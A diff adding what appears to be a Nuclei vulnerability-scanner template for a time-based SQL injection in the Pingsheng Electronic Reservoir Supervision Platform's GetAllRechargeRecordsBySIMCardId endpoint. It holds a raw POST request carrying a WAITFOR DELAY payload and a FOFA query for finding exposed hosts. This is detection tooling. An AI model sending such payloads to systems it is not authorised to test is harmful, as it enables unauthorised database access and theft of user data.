@@ -1,0 +1,36 @@
+id: pingsheng-electronic-sqli
+
+info:
+  name: Pingsheng Electronic Reservoir Supervision Platform - Sql Injection
+  author: s4e-io
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in the GetAllRechargeRecordsBySIMCardId interface of Pingsheng Electronics Reservoir Supervision Platform. An attacker can access the data in the database without authorization, thereby stealing user data and leaking user information.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%B9%B3%E5%8D%87%E7%94%B5%E5%AD%90%E6%B0%B4%E5%BA%93%E7%9B%91%E7%AE%A1%E5%B9%B3%E5%8F%B0GetAllRechargeRecordsBySIMCardId%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+    - https://github.com/zan8in/pxplan/blob/main/goby_pocs/10-13-crack/redteam_20230316121609/CVD-2022-5560.go
+  metadata:
+    verified: "true"
+    max-request: 1
+    fofa-query: "js/PSExtend.js"
+  tags: time-based-sqli,sqli,pingsheng
+
+http:
+  - raw:
+      - |
+        @timeout 20s
+        POST /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        loginIdentifer=&simcardId=';WAITFOR DELAY '0:0:6'--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=6"
+          - 'contains_all(body,"Result","false","Message")'
+          - 'contains(content_type,"text/xml")'
+          - "status_code == 200"
+        condition: and
+# digest: 490a004630440220725dcc954d71d373bee22b9421f3f26e22c1f3b0965cdfc2240a52bd952acac502207c90a859799f3423495cb0d7bb3f0fab9f495fcb325803b303dde4dd425aa0aa:922c64590222798bb761d5b6d8e72950
